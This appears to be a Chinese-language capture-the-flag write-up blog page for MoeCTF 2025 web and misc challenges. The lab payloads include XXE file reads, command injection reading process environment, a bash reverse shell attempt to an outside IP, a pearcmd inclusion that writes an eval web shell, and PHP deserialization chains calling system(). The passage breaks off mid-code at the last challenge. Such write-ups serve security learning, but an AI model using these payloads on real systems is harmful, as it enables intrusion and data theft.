窝那没撸多豆没咕吉豆哦吗吉利；南北绿豆没咕吉豆阿西噶压？阿西噶压没咕吉豆没南北绿豆；哈基米咕吉豆没咕窝那没撸多；阿西噶压奶压多那吉椰奶龙；库路曼波豆没咕吉豆没米阿西噶压，奈诺娜美嘎吉豆没咕吉窝那没撸多。阿西噶压豆没咕吉窝那没撸多，阿西噶压豆没咕吉豆欧莫季里？库路曼波没咕吉豆没窝那没撸多，库路曼波咕吉豆耶咕奶压窝那没撸多？哦吗吉利多那吉豆没米阿西噶压。哈基米吉豆没咕吉欧莫季里；南北绿豆豆没咕吉欧莫季里。南北绿豆豆没咕吉豆没咕南北绿豆？椰奶龙吉豆没米吉豆椰奶龙；库路曼波耶咕吉豆没阿西噶压？欧莫季里咕吉豆没米南北绿豆；南北绿豆吉豆没咕吉豆没哈基米；哦吗吉利咕吉豆没咕吉奈诺娜美嘎？窝那没撸多豆没咕吉豆库路曼波，库路曼波没咕奶压多那吉阿西噶压。窝那没撸多豆没咕吉豆库路曼波？阿西噶压没西一奈哪买噶阿西噶压；哦吗吉利奈哪买噶哦吗吉利；椰奶龙奈哪买噶奈南北绿豆，库路曼波哪买噶奈哪买娜库路曼波，哈基米奈哪买北奈哪买窝那没撸多。欧莫季里噶奈哪买北奈哈基米，椰奶龙哪买噶奈库路曼波？南北绿豆哪买噶奈欧莫季里；哈基米哪买噶奈椰奶龙，奈诺娜美嘎哪买噶奈哪南北绿豆，库路曼波买娜奈哪哦吗吉利？阿西噶压买北奈哪买娜奈库路曼波。欧莫季里哪买噶奈欧莫季里，库路曼波哪买噶奈哪买欧莫季里？库路曼波噶奈哪买噶奈窝那没撸多；阿西噶压哪买噶奈阿西噶压；窝那没撸多哪买噶奈哪买北南北绿豆。库路曼波多多压那欧莫季里？欧莫季里奈哪买娜奈哪哦吗吉利；哈基米买噶奈哪买噶奈库路曼波，库路曼波哪买噶奈库路曼波？奈诺娜美嘎哪买噶奈哪阿西噶压，南北绿豆买噶多多压库路曼波；南北绿豆那奈哪买娜奈库路曼波，库路曼波哪买北奈哪椰奶龙，欧莫季里买噶奈哪买库路曼波。窝那没撸多噶奈哪买噶窝那没撸多，哈基米奈哪买噶阿西噶压。南北绿豆奈哪买噶多椰奶龙？哈基米多压那奈哪阿西噶压；库路曼波买娜奈哪买欧莫季里？库路曼波娜奈哪买噶奈欧莫季里；哈基米哪买噶奈哪椰奶龙。窝那没撸多买噶奈哪奈诺娜美嘎；椰奶龙买噶奈哪买库路曼波，阿西噶压娜奈哪买北椰奶龙。奈诺娜美嘎奈哪买噶奈哈基米；窝那没撸多哪买北奈哪哈基米。奈诺娜美嘎买噶奈哪买噶窝那没撸多？南北绿豆奈哪买噶欧莫季里，库路曼波奈哪买噶奈哪买库路曼波。南北绿豆娜奈哪买南北绿豆；欧莫季里北奈哪买娜奈哦吗吉利。哈基米哪买娜子窝那没撸多；南北绿豆酷波利子撸娜哪哈基米？哈基米哈里椰路阿西噶压，阿西噶压奈哪买噶奈哪哈基米。哈基米买噶奈哪买噶库路曼波？欧莫季里奈哪买噶奈哪南北绿豆，奈诺娜美嘎买噶多多椰奶龙；阿西噶压压那奈哪库路曼波；库路曼波买噶多多压那奈库路曼波；哦吗吉利哪买噶奈哪买哦吗吉利。椰奶龙噶奈哪买噶奈窝那没撸多，阿西噶压哪买噶奈哪买噶欧莫季里，库路曼波多多压那奈库路曼波；窝那没撸多哪买噶多多压那哈基米，窝那没撸多喔米哦啊呀砸奈诺娜美嘎；椰奶龙曼吉豆没咕南北绿豆；库路曼波吉豆没咕吉豆没阿西噶压？哦吗吉利咕吉豆没咕吉哦吗吉利；库路曼波豆没咕奶压库路曼波。库路曼波多那吉豆南北绿豆？奈诺娜美嘎没米吉豆库路曼波；哦吗吉利耶吗一奈哪买奈诺娜美嘎。椰奶龙噶奈哪买噶奈阿西噶压？哈基米哪买噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶阿西噶压；窝那没撸多多多压那阿西噶压，阿西噶压奈哪买北奈阿西噶压，欧莫季里哪买噶奈哪买噶哈基米。哈基米奈哪买噶奈诺娜美嘎？哈基米奈哪买噶库路曼波。南北绿豆奈哪买噶奈哪阿西噶压，奈诺娜美嘎买噶多多压那欧莫季里；南北绿豆奈哪买噶哈基米，窝那没撸多奈哪买北奈哪买南北绿豆，欧莫季里噶奈哪买奈诺娜美嘎？哦吗吉利噶奈哪买哈基米；南北绿豆噶奈哪买南北绿豆；窝那没撸多噶奈哪买娜奈哪椰奶龙，欧莫季里买北奈哪买噶阿西噶压，库路曼波多多压那奈哪买哈基米；哈基米噶奈哪买噶窝那没撸多？欧莫季里奈哪买噶奈哪买哦吗吉利。阿西噶压噶奈哪买噶多哦吗吉利，阿西噶压多压那奈哪买阿西噶压，哈基米北奈哪买南北绿豆，南北绿豆噶奈哪买噶奈阿西噶压，欧莫季里哪买噶奈哦吗吉利。椰奶龙哪买噶奈哈基米，库路曼波哪买噶奈窝那没撸多，奈诺娜美嘎哪买噶多窝那没撸多，椰奶龙多压那奈哪买噶南北绿豆，阿西噶压奈哪买北奈哈基米；哈基米哪买噶奈哪奈诺娜美嘎，哦吗吉利买噶奈哪买噶奈阿西噶压，窝那没撸多哪买噶奈哪阿西噶压。窝那没撸多买娜多多椰奶龙；椰奶龙压那多多压奈诺娜美嘎；阿西噶压那奈哪买娜南北绿豆。哦吗吉利自米哦啊南北绿豆；奈诺娜美嘎南酷基压步酷欧莫季里；奈诺娜美嘎马美友喔奈诺娜美嘎；窝那没撸多诺哪呀喔喵欧莫季里；欧莫季里哩椰奶龙。
</code></pre>
<p>用<a href="https://lhlnb.top/hajimi/base64%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0">https://lhlnb.top/hajimi/base64解码得到</a></p>
<pre><code>‌‌‌‌‍‬﻿‍‌‌‌‌‍‬﻿﻿fakeflag‌‌‌‌‍‬‍‍‌‌‌‌‍‬‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‍‬{‌‌‌‌‍﻿‬﻿you‌‌‌‌‌﻿‌‍‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‍‌_can_‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‌﻿‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‌try‌‌‌‌‌﻿‌‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‌‍_‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‌‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‍searching‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‌﻿_text‌‌‌‌‌﻿‍‬_‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍﻿﻿‍Steganography}
</code></pre>
<p>用零宽字符解密即可</p>
<p><img src="/./image-20250907214513598.png" alt="./image-20250907214513598"></p>
<pre><code>moectf{1b8956b9-a423-4101-a1bd-65be33682c82}
</code></pre>
<h2 id="2-web"><a href="#2-web" class="headerlink" title="2.web"></a>2.web</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>控制台丢jsfuck即可</p>
<p><img src="/./image-20250809121015426.png" alt="./image-20250809121015426"></p>
<pre><code>moectf{jv@vScr1p7_14_so0o0o0o_inT3r3&amp;t!!!}
</code></pre>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p><img src="/./image-20250809121931944.png" alt="./image-20250809121931944"></p>
<pre><code>moectf{f_i2_1s_Your_g00d_fri3nd!!}
</code></pre>
<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>第一个页面源代码得到路由&#x2F;golden_trail,访问之后抓包</p>
<p><img src="/./image-20250809121248333.png" alt="./image-20250809121248333"></p>
<pre><code>moectf{0bs3rv3_Th3_Gold3n_traiL}
</code></pre>
<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>抓包改参数即可</p>
<p><img src="/./image-20250809122757377.png" alt="./image-20250809122757377"></p>
<pre><code>moectf{g3T_P05T-TransmISsiON_1S-a-Go0d-mEtHOd!!1218}
</code></pre>
<h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p>目录穿越</p>
<p><img src="/./image-20250809123248455.png" alt="./image-20250809123248455"></p>
<pre><code>moectf{41I_1NpuT-Is_mA1ICi0u557f1e193}
</code></pre>
<h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><p>第一关get传参</p>
<p><img src="/./image-20250809123453770.png" alt="./image-20250809123453770"></p>
<pre><code>bW9lY3Rme0Mw
</code></pre>
<p>第二关post传参</p>
<p><img src="/./image-20250809123531835.png" alt="./image-20250809123531835"></p>
<pre><code>bjZyNDd1MTQ3
</code></pre>
<p>第三关改xff头</p>
<p><img src="/./image-20250809123653460.png" alt="./image-20250809123653460"></p>
<pre><code>MTBuNV95MHVy
</code></pre>
<p>第四关改ua头</p>
<p><img src="/./image-20250809123849635.png" alt="./image-20250809123849635"></p>
<pre><code>X2g3N1BfbDN2
</code></pre>
<p>第五关:cookie改成如下</p>
<p><img src="/./image-20250809143941431.png" alt="./image-20250809143941431"></p>
<pre><code>M2xfMTVfcjM0
</code></pre>
<p>第六关:</p>
<p><img src="/./image-20250809144034515.png" alt="./image-20250809144034515"></p>
<pre><code>bGx5X2gxOWgh
</code></pre>
<p>第七关:发送put请求</p>
<pre><code class="python">import requests

url = &quot;http://192.168.0.114:50602/void_rebirth&quot;
data = &quot;新生！&quot;
headers = {
    &quot;Content-Type&quot;: &quot;text/plain&quot;
}

response = requests.put(url, data=data, headers=headers)
print(response.status_code)
print(response.text)
</code></pre>
<p><img src="/./image-20250809144242769.png" alt="./image-20250809144242769"></p>
<pre><code>fQ==
</code></pre>
<p>整合起来</p>
<pre><code>bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghbGx5X2gxOWghfQ==
moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!lly_h1}
</code></pre>
<h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><p>万能密码就能登录</p>
<p><img src="/./image-20250809135901469.png" alt="./image-20250809135901469"></p>
<pre><code>moectf{w3IcoMe-T0-5QI_InjECtlOnl1137fd3f6}
</code></pre>
<h3 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h3><p><img src="/./image-20250809135953559.png" alt="./image-20250809135953559"></p>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);
$flag = getenv(&#39;FLAG&#39;);

$a = $_GET[&quot;a&quot;] ?? &quot;&quot;;
$b = $_GET[&quot;b&quot;] ?? &quot;&quot;;

if($a == $b){
    die(&quot;error 1&quot;);
}

if(md5($a) != md5($b)){
    die(&quot;error 2&quot;);
}

echo $flag; error 1
</code></pre>
<pre><code>QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
挑两个上去
</code></pre>
<p><img src="/./image-20250809140130385.png" alt="./image-20250809140130385"></p>
<pre><code>moectf{mdS-lS_NoT-5AF3!!43995d17e}
</code></pre>
<h3 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h3><p>sqlmap秒了</p>
<p><img src="/./image-20250809142856382.png" alt="./image-20250809142856382"></p>
<pre><code>moectf{UnIOn_bASeD_Sq1I-ftW!!1a1580091}
</code></pre>
<h3 id="10-猜数字游戏"><a href="#10-猜数字游戏" class="headerlink" title="10.猜数字游戏"></a>10.猜数字游戏</h3><p>雪瞳找到有&#x2F;static&#x2F;main.js文件</p>
<p><img src="/./image-20250810004954772.png" alt="./image-20250810004954772"></p>
<pre><code class="javascript">let randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000
const guesses = document.querySelector(&#39;.guesses&#39;);
const lastResult = document.querySelector(&#39;.lastResult&#39;);
const lowOrHi = document.querySelector(&#39;.lowOrHi&#39;);
const guessBtn = document.getElementById(&#39;guessBtn&#39;);
const guessField = document.getElementById(&#39;guessField&#39;);

let guessCount = 1;
let resetButton;

function checkGuess() {
  let userGuess = Number(guessField.value);
  if(guessCount === 1) {
    guesses.textContent = &#39;上次猜的数：&#39;;
  }
  guesses.textContent += userGuess + &#39; &#39;;

  if(userGuess === randomNumber) {
    lastResult.textContent = &#39;恭喜你！猜对了！&#39;;
    lastResult.style.backgroundColor = &#39;green&#39;;
    lowOrHi.textContent = &#39;&#39;;
    guessField.disabled = true;
    guessBtn.disabled = true;
    // 猜对后请求flag
    fetch(&#39;/flag&#39;, {method: &#39;POST&#39;})
      .then(res =&gt; res.json())
      .then(data =&gt; {
        document.querySelector(&#39;.flagResult&#39;).textContent = &quot;FLAG: &quot; + data.flag;
      });
    setGameOver();
  } else {
    lastResult.textContent = &#39;!!!游戏结束!!!&#39;;
    lastResult.style.backgroundColor = &#39;red&#39;;
    if(userGuess &lt; randomNumber) {
      lowOrHi.textContent = &#39;你刚才猜低了！&#39;;
    } else if(userGuess &gt; randomNumber) {
      lowOrHi.textContent = &#39;你刚才猜高了！&#39;;
    }
    guessField.disabled = true;
    guessBtn.disabled = true;
    setGameOver();
  }

  guessCount++;
  guessField.value = &#39;&#39;;
  guessField.focus();
}
guessBtn.addEventListener(&#39;click&#39;, checkGuess);

function setGameOver() {
  resetButton = document.createElement(&#39;button&#39;);
  resetButton.textContent = &#39;开始新游戏&#39;;
  document.body.appendChild(resetButton);
  resetButton.addEventListener(&#39;click&#39;, resetGame);
}

function resetGame() {
  guessCount = 1;
  const resetParas = document.querySelectorAll(&#39;.resultParas p&#39;);
  for(let i = 0; i &lt; resetParas.length; i++) {
    resetParas[i].textContent = &#39;&#39;;
  }
  resetButton.parentNode.removeChild(resetButton);

  guessField.disabled = false;
  guessBtn.disabled = false;
  guessField.value = &#39;&#39;;
  guessField.focus();

  lastResult.style.backgroundColor = &#39;white&#39;;

  randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000
}
</code></pre>
<p>控制台直接看randomNumber</p>
<p><img src="/./image-20250810005040285.png" alt="./image-20250810005040285"></p>
<pre><code>moectf{5d439f1c-d610-e49a-f283-6711656c040b}
</code></pre>
<h3 id="11-第十四章-御神关·补天玉碑"><a href="#11-第十四章-御神关·补天玉碑" class="headerlink" title="11.第十四章 御神关·补天玉碑"></a>11.第十四章 御神关·补天玉碑</h3><p>传.htaccess再传个图片马,flag在根目录</p>
<p><img src="/./image-20250817193945350.png" alt="./image-20250817193945350"></p>
<h3 id="12-第十章-天机符阵-revenge"><a href="#12-第十章-天机符阵-revenge" class="headerlink" title="12.第十章 天机符阵_revenge"></a>12.<strong>第十章 天机符阵_revenge</strong></h3><p>一个文本框,随便输入什么进去</p>
<p><img src="/./image-20250817194413325.png" alt="./image-20250817194413325"></p>
<p>xxe漏洞,payload:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE 阵枢 [
  &lt;!ENTITY hacker SYSTEM &quot;file:///flag.txt&quot;&gt;
]&gt;
&lt;阵枢&gt;
  &lt;解析&gt;&amp;hacker;&lt;/解析&gt;
  &lt;输出&gt;未定义&lt;/输出&gt;
&lt;/阵枢&gt;
</code></pre>
<p><img src="/./image-20250817194921962.png" alt="./image-20250817194921962"></p>
<pre><code>moectf{1e866128-7abe-4caa-e010-36d7bf49ab10}
</code></pre>
<h3 id="13-摸金偶遇FLAG，拼尽全力难战胜"><a href="#13-摸金偶遇FLAG，拼尽全力难战胜" class="headerlink" title="13.摸金偶遇FLAG，拼尽全力难战胜"></a>13.<strong>摸金偶遇FLAG，拼尽全力难战胜</strong></h3><pre><code class="javascript">(() =&gt; {
    if (!window.__hooked__) {
        const origFetch = window.fetch;
        window.fetch = async (...args) =&gt; {
            const res = await origFetch(...args);
            if (args[0].includes(&#39;/get_challenge&#39;)) {
                res.clone().json().then(data =&gt; {
                    console.log(&#39;=== 获取到真实答案 ===&#39;, data.numbers);
                    window.__answer__ = data.numbers;
                });
            }
            return res;
        };
        window.__hooked__ = true;
        console.log(&#39;已挂载答案抓取 Hook，请点击开始挑战按钮&#39;);
        return;
    }

    if (!window.__answer__) {
        console.error(&#39;还没获取到答案，请先点击开始挑战按钮&#39;);
        return;
    }

    const code = window.__answer__;
    const buttons = document.querySelectorAll(&#39;.inputContentBtnAreaItem&#39;);
    if (!buttons.length) {
        console.error(&#39;未找到数字按钮，请确保挑战界面已加载&#39;);
        return;
    }

    let i = 0;
    function clickNext() {
        if (i &gt;= code.length) {
            console.log(&#39;=== 自动通关完成 ===&#39;);
            return;
        }
        const num = code[i];
        const btn = Array.from(buttons).find(b =&gt; b.textContent.trim() === String(num));
        if (btn) {
            btn.click();
            console.log(`输入第${i+1}位：${num}`);
        } else {
            console.error(`找不到数字按钮：${num}`);
        }
        i++;
        // 高速但保留间隔，100ms 已经非常快
        setTimeout(clickNext, 100);
    }

    clickNext();
})();
</code></pre>
<p><img src="/./image-20250817200041374.png" alt="./image-20250817200041374"></p>
<pre><code>moectf{53a0d1ed-ed64-9a27-8e42-8de2ccedd45c}
</code></pre>
<h3 id="14-第十三章-通幽关·灵纹诡影"><a href="#14-第十三章-通幽关·灵纹诡影" class="headerlink" title="14.第十三章 通幽关·灵纹诡影"></a>14.<strong>第十三章 通幽关·灵纹诡影</strong></h3><ul>
<li>灵纹必须包含噬心魔印（十六进制校验码：FFD8FF）</li>
</ul>
<p>在jpg尾部加一句话木马即可</p>
<p><img src="/./image-20250817201323830.png" alt="./image-20250817201323830"></p>
<pre><code>moectf{8bc69f8d-67fc-fa57-64cf-58e31cae34c3}
</code></pre>
<h3 id="15-10-第十章-天机符阵"><a href="#15-10-第十章-天机符阵" class="headerlink" title="15.10 第十章 天机符阵"></a>15.<strong>10 第十章 天机符阵</strong></h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE 阵枢 [
  &lt;!ENTITY hacker SYSTEM &quot;file:///var/www/html/flag.txt&quot;&gt;
]&gt;
&lt;阵枢&gt;
  &lt;解析&gt;&amp;hacker;&lt;/解析&gt;
  &lt;输出&gt;&lt;/输出&gt;
&lt;/阵枢&gt;
</code></pre>
<p><img src="/./image-20250817202417483.png" alt="./image-20250817202417483"></p>
<pre><code>moectf{G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l}
</code></pre>
<h3 id="16-第十二章-玉魄玄关·破妄"><a href="#16-第十二章-玉魄玄关·破妄" class="headerlink" title="16.第十二章 玉魄玄关·破妄"></a>16.<strong>第十二章 玉魄玄关·破妄</strong></h3><p>flag在环境变量</p>
<p><img src="/./image-20250817203437631.png" alt="./image-20250817203437631"></p>
<pre><code>moectf{715601ed-5928-ec1b-b19c-08e6ebd67f72}
</code></pre>
<h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><pre><code>HDdss看到了 GET 参数名由m,n,o,p,q这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道参数名等于参数值才能进入
</code></pre>
<p>先准备好参数和值</p>
<pre><code class="python">import itertools

# 字母列表
letters = [&#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;]

# 生成所有可能的排列
permutations = list(itertools.permutations(letters))

# 打开文件并写入
with open(&#39;1.txt&#39;, &#39;w&#39;) as file:
    for perm in permutations:
        # 将排列转换为字符串
        param = &#39;&#39;.join(perm)
        # 写入 ?xxxxx=xxxxx 格式
        file.write(f&#39;?{param}={param}\n&#39;)
</code></pre>
<p>放在bp里爆破</p>
<p><img src="/./image-20250818122234649.png" alt="./image-20250818122234649"></p>
<p>用得到的参数和值访问,用伪协议读.&#x2F;flag.php</p>
<pre><code class="php">php://filter/read=convert.base64-encode/resource=./flag.php
</code></pre>
<p><img src="/./image-20250818122316633.png" alt="./image-20250818122316633"></p>
<pre><code>PD9waHANCmVjaG8gImZsYWflsLHlnKjov5nkuobvvIznnIvkuI3liLDlkJfvvIzmmK/ogIHlvJ/looPnlYzkuI3lpJ/lkKciOw0KLy9tb2VjdGZ7ZGJkOTFlOTItZDI4Yi0zYTMwLWMyNjItMWNhNDNjOWE1M2MyfQ==

moectf{dbd91e92-d28b-3a30-c262-1ca43c9a53c2}
</code></pre>
<h3 id="18"><a href="#18" class="headerlink" title="18."></a>18.</h3><pre><code class="bash">127.0.0.1; cat /proc/self/environ | grep -i flag
</code></pre>
<p><img src="/./image-20250818144543604.png" alt="./image-20250818144543604"></p>
<pre><code>moectf{ee2f1402-c648-2d0b-52ed-f5b30d41e8f6}
</code></pre>
<h3 id="19"><a href="#19" class="headerlink" title="19."></a>19.</h3><p>给了几个附件</p>
<pre><code>index.php
&lt;?php
error_reporting(0);
highlight_file(__FILE__);

include($_GET[&#39;file&#39;] . &quot;.php&quot;);

php.ini
[PHP]
allow_url_fopen = On
allow_url_include = On

entrypoint.sh
#!/bin/bash
echo $FLAG &gt; /flag-$(cat /dev/urandom | tr -dc &#39;a-zA-Z0-9&#39; | head -c 30).txt
unset FLAG
apache2-foreground
</code></pre>
<p>首先尝试了反弹shell</p>
<pre><code class="php">&lt;?php
system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/http://47.122.131.175//2333 0&gt;&amp;1&#39;&quot;);
?&gt;
没用
</code></pre>
<p>发现是pearcmd文件包含</p>
<p><a href="https://blog.csdn.net/m0_56019217/article/details/143868969">https://blog.csdn.net/m0_56019217/article/details/143868969</a></p>
<pre><code>http://127.0.0.1:52970/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=eval($_POST[1]);?%3E+/var/www/html/shell.php
</code></pre>
<p>这一步要用bp传,然后访问shell.php即可rce</p>
<p><img src="/./image-20250823221837890.png" alt="./image-20250823221837890"></p>
<pre><code>moectf{295f1bc5-65de-55a1-2f82-0c41669e1bf5}
</code></pre>
<h3 id="20"><a href="#20" class="headerlink" title="20."></a>20.</h3><pre><code class="php">&lt;?php
highlight_file(__FILE__);

class A {
    public $a;
    function __destruct() {
        eval($this-&gt;a);
    }
}

if(isset($_GET[&#39;a&#39;])) {
    unserialize($_GET[&#39;a&#39;]);
}
</code></pre>
<pre><code class="php">&lt;?php
class A {
    public $a = &quot;system(&#39;ls /&#39;);&quot;;
}
$a = new A();
echo serialize($a);

&lt;?php
class A {
    public $a = &quot;system(&#39;cat /f*&#39;);&quot;;
}
$a = new A();
echo serialize($a);
</code></pre>
<p><img src="/./image-20250823155706531.png" alt="./image-20250823155706531"></p>
<pre><code>moectf{b7e12fcd-b8c3-edcf-db0a-e85c070d7b45}
</code></pre>
<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><pre><code class="php">&lt;?php
highlight_file(__FILE__);

class PersonA {
    private $name;
    function __wakeup() {
        $name=$this-&gt;name;
        $name-&gt;work();
    }
}

class PersonB {
    public $name;
    function work(){
        $name=$this-&gt;name;
        eval($name);
    }

}

if(isset($_GET[&#39;person&#39;])) {
    unserialize($_GET[&#39;person&#39;]);
}
</code></pre>
<p>通过personA调用personB中的work()方法触发eval,想要把一个对象赋值给一个对象属性，而且还是私有的属性，我们不能直接赋值，也不能在外面赋值，但是我们可以使用 <code>__construct</code> 构造函数来赋值</p>
<pre><code class="php">&lt;?php
class PersonA {
    private $name;
    public function __construct($xxx) {
        $this-&gt;name = $xxx;
    }

}

class PersonB {
    public $name = &quot;system(&#39;cat /f*&#39;);&quot;; // 任意PHP代码
}
$b=new personB();
$a=new PersonA($b);
echo urlencode(serialize($a));
?&gt;
moectf{84e140ac-1a09-8161-6c26-78c2c6517bfe}
</code></pre>
<h3 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h3><pre><code class="php">&lt;?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;

    public function __invoke($id)
    {
        $name = $this-&gt;id;
        $name-&gt;name = $id;
        $name-&gt;age = $this-&gt;name;
    }
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this-&gt;name;
        $id = $this-&gt;id;
        $age = $this-&gt;age;
        $name-&gt;$id($age);//漏洞点,把$name赋值为对象,方法名为 $id，参数为 $age
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this-&gt;name = $value;
    }
}

class PersonC extends Person
{
    public function __Check($age)
    {
        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))
        {
            die(&quot;Hacker!&quot;);
        }
        $name = $this-&gt;name;
        $name($age);
    }

    public function __wakeup()
    {
        $age = $this-&gt;age;
        $name = $this-&gt;id;
        $name-&gt;age = $age;
        $name($this);
    }
}

if(isset($_GET[&#39;person&#39;]))
{
    $person = unserialize($_GET[&#39;person&#39;]);
}
</code></pre>
<pre><code class="php">漏洞分析和利用链路

PersonA::__destruct()：
$name = $this-&gt;name;
$id = $this-&gt;id;
$age = $this-&gt;age;
$name-&gt;$id($age);  // 这里动态调用方法：对象 $name 的方法名为 $id，参数为 $age。
我们可以将 $name 设置为一个 PersonC 对象，$id 设置为 &quot;__Check&quot;，$age 设置为 &quot;cat flag&quot;，从而调用 PersonC::__Check(&quot;cat flag&quot;)。


PersonC::__Check($age)：
先检查 if (str_contains($this-&gt;age . $this-&gt;name, &quot;flag&quot;)) die(&quot;Hacker!&quot;);
我们设置 PersonC 的 $age = &quot;&quot;，$name = &quot;system&quot;，所以 &quot;&quot; . &quot;system&quot; = &quot;system&quot;，不包含 &quot;flag&quot;，绕过检查。

然后 $name = $this-&gt;name;（即 &quot;system&quot;）
$name($age);  // 这里 $name 是字符串 &quot;system&quot;，但在 PHP 中，如果字符串是内置函数名，可以直接作为函数调用：system(&quot;cat flag&quot;)，实现命令执行。



PersonC::__wakeup()：
在反序列化时会调用（因为 PersonC 是 PersonA 的属性）。
内部逻辑：设置一些属性并调用 __invoke()。
在这个利用中，我们利用它来辅助设置对象链：PersonC 的 $id 设置为一个 Person 对象（内嵌另一个 Person），以便在 __wakeup() 中触发 __invoke() 来调整属性（虽然在本链路中不是核心，但需要匹配序列化结构以确保反序列化成功）。



Person::__invoke($id)：
在 __wakeup() 中被调用，用于设置嵌套对象的属性（如 $name-&gt;name = $id; 等）。
这部分确保对象链完整，但不直接参与命令执行。



绕过点：
检查只针对 $this-&gt;age . $this-&gt;name，不检查参数 $age，所以 &quot;cat flag&quot; 可以包含 &quot;flag&quot; 而不会触发 die。
PersonB::__set() 未在本利用中使用。


总体链路：反序列化 PersonA → 调用 __wakeup()（在 PersonC 上，设置嵌套属性） → 脚本结束调用 PersonA::__destruct() → 调用 PersonC::__Check(&quot;cat flag&quot;) → 绕过检查 → 调用 system(&quot;cat flag&quot;)。
</code></pre>
<pre><code class="php">&lt;?php

// 定义所有类（继承关系和属性必须匹配原代码，以确保序列化格式一致）
class Person {
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person {
    // 无需实现方法，只需类定义
}

class PersonB extends Person {
    // 未使用，但定义以完整
}

class PersonC extends Person {
    // 无需实现方法，只需类定义
}

// 创建嵌套对象链
// 最内层：一个空 Person 对象 (P2)
$p2 = new Person();  // 无属性设置，序列化为 O:6:&quot;Person&quot;:0:{}

// 中层：一个 Person 对象 (P1)，其 id = P2
$p1 = new Person();
$p1-&gt;id = $p2;  // name 和 age 未设置，序列化时不出现

// PersonC 对象 (PC)
$pc = new PersonC();
$pc-&gt;name = &quot;system&quot;;  // 用于最终调用 system()
$pc-&gt;id = $p1;         // 用于 __wakeup() 中的嵌套调用
$pc-&gt;age = &quot;&quot;;         // 用于绕过 __Check() 中的 str_contains 检查

// PersonA 对象 (PA)
$pa = new PersonA();
$pa-&gt;name = $pc;       // destruct 时调用此对象的 __Check()
$pa-&gt;id = &quot;__Check&quot;;   // 方法名
$pa-&gt;age = &quot;cat flag&quot;; // 参数，传递给 system()

// 序列化 PersonA 对象
$serialized = serialize($pa);

// 输出序列化字符串（与您提供的一致）
echo $serialized . PHP_EOL;

?&gt;
O:7:&quot;PersonA&quot;:3:{s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:{s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:1:{s:2:&quot;id&quot;;O:6:&quot;Person&quot;:0:{}}s:3:&quot;age&quot;;s:0:&quot;&quot;;}s:2:&quot;id&quot;;s:7:&quot;__Check&quot;;s:3:&quot;age&quot;;s:8:&quot;cat flag&quot;;}
</code></pre>
<h3 id="23-第十九章-revenge"><a href="#23-第十九章-revenge" class="headerlink" title="23.第十九章_revenge"></a>23.<strong>第十九章_revenge</strong></h3><pre><code class="php">&lt;?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this-&gt;name;//name设置成new personC对象
        $id = $this-&gt;id;//id即函数名
        $name-&gt;$id($this-&gt;age); name=new personC,id=check,age=env
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this-&gt;name = $value;
    }

    public function __invoke($id)
    {
        $name = $this-&gt;id;
        $name-&gt;name = $id;
        $name-&gt;age = $this-&gt;name;
    }
}

class PersonC extends Person
{
    public function check($age)
    {
        $name=$this-&gt;name;
        if($age == null)
        {
